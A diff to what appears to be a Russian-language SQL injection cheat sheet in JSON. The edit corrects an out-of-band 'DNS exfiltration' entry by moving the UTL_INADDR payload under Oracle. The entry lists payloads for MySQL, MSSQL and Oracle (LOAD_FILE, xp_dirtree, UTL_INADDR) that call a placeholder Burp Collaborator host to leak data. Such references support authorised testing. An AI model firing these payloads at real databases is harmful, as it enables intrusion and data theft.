@@ -102,7 +102,7 @@
       "title": "Out-of-Band (OAST) — DNS-эксфильтрация",
       "language": "sql",
       "tags": ["oob", "oast", "exfiltration"],
-      "body": "-- MySQL\nLOAD_FILE('\\\\\\\\BURP-COLLABORATOR-SUBDOMAIN\\\\a')\nSELECT ... INTO OUTFILE '\\\\\\\\BURP-COLLABORATOR-SUBDOMAIN\\a'\n\n-- MSSQL\nSELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')\nexec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'"
+      "body": "-- MySQL\nLOAD_FILE('\\\\\\\\BURP-COLLABORATOR-SUBDOMAIN\\\\a')\nSELECT ... INTO OUTFILE '\\\\\\\\BURP-COLLABORATOR-SUBDOMAIN\\a'\n\n-- MSSQL\nexec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'\n\n-- Oracle\nSELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN') FROM dual"
     },
     {
       "subcategory": "Детект и методология",
